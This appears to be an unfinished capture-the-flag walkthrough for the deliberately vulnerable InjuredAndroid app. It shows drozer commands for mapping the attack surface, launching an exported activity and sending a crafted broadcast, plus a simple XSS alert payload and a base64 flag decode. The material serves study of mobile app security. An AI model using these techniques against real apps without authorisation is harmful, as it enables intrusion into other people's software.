# Injured Android

* [ ] Test fo Leaked Secrets with [apkX](https://github.com/cyinnove/apkX)

```
sallam@Mac-mini-Mosaad tools % ./apkx ../apps/InjuredAndroid.apk 
```

<figure><img src="../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

* [ ] Test for Janus Bug with [j88nx](https://github.com/h0tak88r/j88nx)

```
sallam@Mac-mini-Mosaad tools % ./j88nx -apk ../apps/InjuredAndroid.apk 
```

<figure><img src="../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

* [ ] Use Drozer for Information Gathering and and Attack Surface Mapping

```bash
# Enable drozer agent in the emulator
# Starting Session
adb forward tcp:31415 tcp:31415
# start the drozer application in the emulator
drozer console connect
drozer console connect --server <ip>

# List Modes
ls
ls activity

# Retrieving package information 
run app.package.list -f <app name>
run app.package.info -a <package name>

# Identifying the attack surface
run app.package.attacksurface <package name>
```

<figure><img src="../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

* [ ] **XSS**

```
<script>alert('Android');</script>
```

<figure><img src="../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

* [ ] **Challenge 1:** Login Activity

<figure><img src="../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

* [ ] **Challenge 2:** exported activity

<figure><img src="../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

```
dz> run app.activity.start --component b3nac.injuredandroid b3nac.injuredandroid.b25lActivity
Attempting to run shell module
```

* [ ] **Challenge 3**: Resopurce

<figure><img src="../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

* [ ] **Challenge 4**: Decoder

<figure><img src="../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (317).png" alt=""><figcaption><p>Take this and decode it </p></figcaption></figure>

```
echo 'NF9vdmVyZG9uZV9vbWVsZXRz' | base64 -d
```

* [ ] **Challenge 5**: Exploit Exported Broadcast Receiver

```
# in drozer
run app.broadcast.info -a b3nac.injuredandroid -i
run app.broadcast.send --component b3nac.injuredandroid b3nac.injandroid.TestBroadcastReceiver --extra string url hacked
```

<figure><img src="../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

* [ ] **Challenge 6:**&#x20;
*

